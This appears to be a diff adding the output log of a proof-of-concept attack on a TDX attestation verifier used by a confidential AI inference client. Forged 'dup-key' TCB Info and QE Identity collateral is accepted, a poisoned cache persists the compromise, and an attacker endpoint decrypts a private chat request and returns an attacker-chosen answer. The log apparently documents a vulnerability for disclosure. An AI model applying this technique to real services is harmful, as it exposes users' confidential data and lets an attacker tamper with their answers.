@@ -1,0 +1,37 @@
+forged quote: QE MRSIGNER = ec3db9da70d7f2a34491446bd172989fee77fb04814492c27d48da32b6f3a4c1 | Intel TD_QE MRSIGNER = dc9e2a7c6f948f17474e34a7fc43ed030f7c1563f1babddf6340c82e0e54a8c5
+
+=== S0 control: genuine Intel collateral
+  [REJECTED] TinfoilAI() verification failed: ValueError: TDX attestation verification failed: Collateral validation failed: No matching TCB level found for the quote's SVN values
+  network: ['https://router.inference.tinfoil.example/.well-known/tinfoil-attestation', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/tcb', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/qe/identity', 'tdx-proxy/api.trustedservices.intel.com/sgx/certification/v4/pckcrl', 'tdx-proxy/certificates.trustedservices.intel.com/IntelSGXRootCA.der']
+
+=== S1 ablation: dup-key TCB Info only (QE Identity genuine)
+  [REJECTED] TinfoilAI() verification failed: ValueError: TDX attestation verification failed: Collateral validation failed: QE report MRSIGNER does not match expected value. Got ec3db9da70d7f2a34491446bd1729
+  network: ['https://router.inference.tinfoil.example/.well-known/tinfoil-attestation', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/tcb', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/qe/identity', 'tdx-proxy/api.trustedservices.intel.com/sgx/certification/v4/pckcrl', 'tdx-proxy/certificates.trustedservices.intel.com/IntelSGXRootCA.der']
+
+=== S2 attack: dup-key TCB Info + dup-key QE Identity
+  [ACCEPTED] securityVerified=True hpkePublicKey==attacker: True tlsFP==attacker: True
+  network: ['https://router.inference.tinfoil.example/.well-known/tinfoil-attestation', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/tcb', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/qe/identity', 'tdx-proxy/api.trustedservices.intel.com/sgx/certification/v4/pckcrl', 'tdx-proxy/certificates.trustedservices.intel.com/IntelSGXRootCA.der']
+  attacker endpoint decrypted POST https://router.inference.tinfoil.example/v1/chat/completions: {"model":"llama3-3-70b","messages":[{"role":"user","content":"PRIVATE: my diagnosis is X, what should I do?"}],"user_cac
+  victim received (EHBP-authenticated) answer: 'ATTACKER-CHOSEN ANSWER'
+
+=== S3 persistence: new TinfoilAI() later; attacker no longer on collateral path
+  [ACCEPTED] securityVerified=True hpkePublicKey==attacker: True tlsFP==attacker: True
+  network: ['https://router.inference.tinfoil.example/.well-known/tinfoil-attestation']
+
+=== S4b ablation: bundle/gateway mode, dup-key TCB Info but genuine QE Identity
+  [REJECTED] TinfoilAI() verification failed: ValueError: TDX attestation verification failed: Collateral validation failed: QE report MRSIGNER does not match expected value. Got ec3db9da70d7f2a34491446bd1729
+  network: ['https://atc.tinfoil.example/attestation', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/tcb', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/qe/identity', 'tdx-proxy/api.trustedservices.intel.com/sgx/certification/v4/pckcrl', 'tdx-proxy/certificates.trustedservices.intel.com/IntelSGXRootCA.der']
+
+=== S4 attack: proxy-friendly bundle mode, attacker = bundle service + gateway + tdx-proxy
+  [ACCEPTED] securityVerified=True hpkePublicKey==attacker: True tlsFP==attacker: True
+  network: ['https://atc.tinfoil.example/attestation', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/tcb', 'tdx-proxy/api.trustedservices.intel.com/tdx/certification/v4/qe/identity', 'tdx-proxy/api.trustedservices.intel.com/sgx/certification/v4/pckcrl', 'tdx-proxy/certificates.trustedservices.intel.com/IntelSGXRootCA.der']
+  attacker endpoint decrypted POST https://gateway.tinfoil.example/v1/chat/completions: {"model":"llama3-3-70b","messages":[{"role":"user","content":"PRIVATE: my diagnosis is X, what should I do?"}],"user_cac
+  victim received (EHBP-authenticated) answer: 'ATTACKER-CHOSEN ANSWER'
+
+SUMMARY
+  S0 genuine TCB Info + genuine QE Identity: REJECTED
+  S1 forged TCB Info + genuine QE Identity: REJECTED
+  S2 forged TCB Info + forged QE Identity: ACCEPTED
+  S3 later session, collateral path honest/unreachable, poisoned cache: ACCEPTED
+  S4b bundle+gateway mode, dup-key TCB Info + GENUINE QE Identity: REJECTED
+  S4 bundle+gateway mode (Tinfoil bundle service + gateway + tdx-proxy): ACCEPTED
